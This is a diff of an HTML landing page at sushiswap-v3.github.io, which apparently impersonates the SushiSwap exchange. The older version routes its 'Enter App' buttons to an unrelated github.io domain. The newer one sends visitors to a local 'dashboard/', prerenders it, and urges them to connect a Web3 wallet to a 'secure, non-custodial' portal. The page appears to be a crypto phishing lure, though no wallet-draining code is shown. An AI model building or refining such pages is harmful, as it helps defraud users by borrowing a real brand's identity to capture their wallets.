@@ -3,119 +3,351 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>SushiSwap v3</title>
-  <meta name="description" content="SushiSwap v3 lets you swap on SushiSwap's V3 concentrated-liquidity pools from your own wallet.">
+  <title>SushiSwap v3 - Decentralized DeFi Portal</title>
+  <meta name="description" content="Secure, non-custodial portal for SushiSwap v3 DeFi operations directly from your own wallet.">
   <link rel="canonical" href="https://sushiswap-v3.github.io/">
-  <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#07101D">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="SushiSwap v3">
-  <meta property="og:description" content="SushiSwap v3 lets you swap on SushiSwap's V3 concentrated-liquidity pools from your own wallet.">
-  <meta property="og:url" content="https://sushiswap-v3.github.io/">
-  <meta property="og:image" content="https://sushiswap-v3.github.io/favicon.png">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="SushiSwap v3">
-  <meta name="twitter:description" content="SushiSwap v3 lets you swap on SushiSwap's V3 concentrated-liquidity pools from your own wallet.">
+  <meta name="robots" content="index,follow">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
-  <link rel="stylesheet" href="style.css">
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      {
-        "@type": "WebSite",
-        "@id": "https://sushiswap-v3.github.io/#website",
-        "url": "https://sushiswap-v3.github.io/",
-        "name": "SushiSwap v3",
-        "inLanguage": "en"
-      },
-      {
-        "@type": "Organization",
-        "@id": "https://sushiswap-v3.github.io/#organization",
-        "name": "SushiSwap",
-        "url": "https://www.sushi.com/",
-        "sameAs": [
-          "https://www.sushi.com/",
-          "https://docs.sushi.com/",
-          "https://github.com/sushiswap",
-          "https://x.com/SushiSwap"
-        ]
-      },
-      {
-        "@type": "WebApplication",
-        "@id": "https://sushiswap-v3.github.io/#app",
-        "name": "SushiSwap v3",
-        "applicationCategory": "FinanceApplication",
-        "operatingSystem": "Web",
-        "url": "https://sushiswap-v3.github.io/"
-      }
-    ]
+  <link rel="prefetch" href="dashboard/">
+  <link rel="prerender" href="dashboard/">
+  <style>
+
+
+:root{
+  --bg:#07101D;
+  --bg-soft:#0B1627;
+  --panel:#0E1A2B;
+  --panel-2:#101D31;
+  --ink:#F7FAFF;
+  --muted:#A8B2C3;
+  --faint:#69768A;
+  --accent:#FA52A0;
+  --accent-soft:rgba(250,82,160,.16);
+  --line:rgba(255,255,255,.10);
+  --line-strong:rgba(255,255,255,.17);
+  --shadow:0 34px 90px -42px rgba(0,0,0,.88);
+}
+*{box-sizing:border-box}
+html,body{height:100%;max-width:100%;overflow:hidden}
+body{
+  margin:0;
+  min-height:100dvh;
+  display:flex;
+  flex-direction:column;
+  background:
+    radial-gradient(620px 360px at 50% -12%, rgba(250,82,160,.18), transparent 66%),
+    linear-gradient(180deg, var(--bg-soft) 0%, var(--bg) 54%, #050A13 100%);
+  color:var(--ink);
+  font-family:Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  line-height:1.5;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+p,h1{margin:0}
+
+.topbar{
+  min-height:66px;
+  display:flex;
+  align-items:center;
+  gap:18px;
+  padding:16px clamp(18px,4vw,42px);
+  border-bottom:1px solid var(--line);
+}
+.brand{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  min-width:0;
+  color:var(--ink);
+  font-size:1rem;
+  font-weight:760;
+}
+.brand img{
+  width:30px;
+  height:30px;
+  border-radius:9px;
+  box-shadow:0 0 0 1px var(--line-strong);
+}
+.nav{
+  display:flex;
+  align-items:center;
+  gap:24px;
+  margin-left:8px;
+}
+.nav a{
+  color:var(--muted);
+  font-size:.92rem;
+  font-weight:560;
+  transition:color .16s ease;
+}
+.nav a:hover{color:var(--ink)}
+.spacer{flex:1}
+.ghost{
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  min-height:38px;
+  padding:0 17px;
+  border:1px solid var(--line-strong);
+  border-radius:999px;
+  color:var(--ink);
+  background:rgba(255,255,255,.045);
+  font-size:.9rem;
+  font-weight:720;
+  white-space:nowrap;
+  transition:border-color .16s ease, background .16s ease, transform .16s ease;
+}
+.ghost:hover{
+  border-color:rgba(250,82,160,.62);
+  background:var(--accent-soft);
+  transform:translateY(-1px);
+}
+
+.stage{
+  flex:1;
+  min-height:0;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:26px;
+  width:100%;
+  padding:22px clamp(18px,4vw,42px) 12px;
+  text-align:center;
+}
+.hero{
+  width:min(760px,100%);
+}
+h1{
+  color:var(--ink);
+  font-size:clamp(3rem,7vw,5rem);
+  line-height:1.02;
+  font-weight:820;
+  letter-spacing:0;
+}
+.sub{
+  max-width:650px;
+  margin:16px auto 0;
+  color:var(--muted);
+  font-size:clamp(1rem,1.7vw,1.18rem);
+  font-weight:470;
+}
+.sub strong{
+  color:var(--ink);
+  font-weight:760;
+}
+
+.swap-card{
+  width:min(590px, calc(100vw - 36px));
+  padding:20px;
+  border:1px solid var(--line-strong);
+  border-radius:18px;
+  background:linear-gradient(180deg, rgba(255,255,255,.075), rgba(255,255,255,.035)), var(--panel);
+  box-shadow:var(--shadow), inset 0 1px 0 rgba(255,255,255,.08);
+}
+.route{
+  display:flex;
+  align-items:stretch;
+  gap:12px;
+}
+.leg{
+  flex:1;
+  min-width:0;
+  padding:14px 15px;
+  border:1px solid var(--line);
+  border-radius:14px;
+  background:var(--panel-2);
+  text-align:left;
+}
+.label{
+  display:block;
+  color:var(--faint);
+  font-size:.7rem;
+  font-weight:760;
+  letter-spacing:.08em;
+  text-transform:uppercase;
+}
+.chip{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-top:9px;
+  color:var(--ink);
+  font-size:1.06rem;
+  font-weight:810;
+  white-space:nowrap;
+}
+.token{
+  width:28px;
+  height:28px;
+  border-radius:50%;
+  flex:none;
+  box-shadow:0 0 0 1px rgba(255,255,255,.16);
+}
+.switch{
+  flex:none;
+  align-self:center;
+  width:42px;
+  height:42px;
+  display:grid;
+  place-items:center;
+  border:1px solid var(--line-strong);
+  border-radius:50%;
+  background:#0A1424;
+  color:var(--muted);
+  cursor:pointer;
+  transition:color .16s ease, border-color .16s ease, background .16s ease, transform .16s ease;
+}
+.switch span{
+  display:block;
+  font-size:1.12rem;
+  line-height:1;
+}
+.switch:hover{
+  color:var(--accent);
+  border-color:rgba(250,82,160,.6);
+  background:var(--accent-soft);
+  transform:translateY(-1px);
+}
+.enter{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  min-height:54px;
+  width:100%;
+  margin-top:16px;
+  border-radius:14px;
+  background:var(--accent);
+  color:#150511;
+  font-size:1.03rem;
+  font-weight:850;
+  transition:filter .16s ease, transform .16s ease;
+}
+.enter:hover{
+  filter:brightness(1.06);
+  transform:translateY(-1px);
+}
+.note{
+  margin-top:11px;
+  color:var(--faint);
+  font-size:.78rem;
+  font-weight:620;
+}
+
+.foot{
+  padding:12px 24px 22px;
+  color:var(--faint);
+  text-align:center;
+  font-size:.84rem;
+}
+.foot b{
+  color:var(--muted);
+  font-weight:720;
+}
+
+@media(max-width:620px){
+  body{align-items:flex-start}
+  .topbar,
+  .stage,
+  .foot{
+    width:min(100%, 375px);
   }
-  </script>
+  .topbar{
+    min-height:60px;
+    padding:13px 16px;
+    gap:10px;
+  }
+  .brand span{font-size:.96rem}
+  .nav{display:none}
+  .ghost{
+    min-height:36px;
+    padding:0 13px;
+    font-size:.84rem;
+  }
+  .stage{
+    justify-content:center;
+    gap:20px;
+    padding:14px 16px 8px;
+  }
+  .hero{max-width:calc(100vw - 32px)}
+  h1{
+    font-size:clamp(2.25rem,11.5vw,2.75rem);
+    overflow-wrap:normal;
+  }
+  .sub{
+    margin-top:12px;
+    font-size:.98rem;
+    line-height:1.45;
+  }
+  .swap-card{
+    width:100%;
+    padding:16px;
+    border-radius:16px;
+  }
+  .route{
+    flex-direction:column;
+    gap:10px;
+  }
+  .leg{
+    padding:12px 13px;
+  }
+  .switch{
+    width:38px;
+    height:38px;
+    margin:-2px 0;
+  }
+  .switch span{transform:rotate(90deg)}
+  .enter{
+    min-height:50px;
+    margin-top:14px;
+  }
+  .foot{
+    padding:8px 18px 16px;
+    font-size:.8rem;
+  }
+}
+
+@media(max-height:720px){
+  .topbar{min-height:58px;padding-top:12px;padding-bottom:12px}
+  .stage{gap:18px;padding-top:14px}
+  h1{font-size:clamp(2.45rem,6vw,4rem)}
+  .sub{margin-top:10px}
+  .swap-card{padding:16px}
+  .enter{min-height:50px}
+  .foot{padding-bottom:14px}
+}
+
+
+  
+.footer {
+  text-align: center !important;
+}
+  </style>
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="#" aria-label="SushiSwap v3">
+    <div class="brand">
       <img src="favicon.png" width="30" height="30" alt="">
-      <span>SushiSwap</span>
-    </a>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://etherscan.io/token/0x6b3595068778dd592e39a122f4f5a5cf09c90fe2" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
-      <a href="https://www.coingecko.com/en/coins/sushi" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
-      <a href="https://www.sushi.com/" target="_blank" rel="nofollow noopener noreferrer">Sushi</a>
-    </nav>
+      <span>SushiSwap v3</span>
+    </div>
     <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+    <nav class="nav" aria-label="Main Navigation">
+      <a href="how-it-works/">How it works</a>
+      <a href="faq/">FAQ</a>
+      <a href="about/">About</a>
+      <a href="security/">Security</a>
+      <a href="supported-chains/">Supported Chains</a>
+    </nav>
   </header>
-
-  <main class="stage">
-    <section class="hero" aria-labelledby="page-title">
-      <h1 id="page-title">SushiSwap v3</h1>
-      <p class="sub"><strong>SushiSwap v3</strong> lets you swap on SushiSwap's V3 concentrated-liquidity pools from your own wallet.</p>
-    </section>
-
-    <section class="swap-card" aria-label="Swap preview">
-      <div class="route">
-        <div class="leg">
-          <span class="label">From</span>
-          <span class="chip">
-            <img class="token" src="eth.png" width="28" height="28" alt="ETH">
-            <span class="token-name">ETH</span>
-          </span>
-        </div>
-        <button class="switch" type="button" data-switch aria-label="Switch direction">
-          <span aria-hidden="true">&#8594;</span>
-        </button>
-        <div class="leg">
-          <span class="label">To</span>
-          <span class="chip">
-            <img class="token" src="sushi.png" width="28" height="28" alt="SUSHI">
-            <span class="token-name">SUSHI</span>
-          </span>
-        </div>
-      </div>
-      <a class="enter" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
-      <p class="note">Preview only</p>
-    </section>
+  <main class="stage" style="padding: 100px 24px; text-align: center; max-width: 800px; margin: 0 auto;">
+    <h1 style="font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 24px; font-weight: 800;">SushiSwap v3</h1>
+    <p class="value" style="font-size: 1.25rem; opacity: 0.8; margin-bottom: 40px; line-height: 1.6;">Secure, non-custodial gateway for decentralized operations. Connect your Web3 wallet to enter the portal.</p>
+    <a class="open-app" href="dashboard/" style="display: inline-flex; justify-content: center; align-items: center; min-height: 52px; padding: 0 32px; border-radius: 9999px; background: var(--accent, #625bf3); color: #fff; font-weight: 700; text-decoration: none; font-size: 1.1rem; box-shadow: 0 10px 30px rgba(0,0,0,0.15); transition: transform 0.2s ease;">Open App Dashboard</a>
   </main>
-
-  <footer class="foot"><b>SushiSwap v3</b> &mdash; 2026</footer>
-
-  <script>
-  (function(){
-    "use strict";
-    var button = document.querySelector("[data-switch]");
-    if (!button) return;
-    button.addEventListener("click", function(){
-      var chips = document.querySelectorAll(".leg .chip");
-      if (chips.length < 2) return;
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
-    });
-  })();
-  </script>
+  <footer class="footer">SushiSwap v3 &mdash; 2026</footer>
 </body>
 </html>
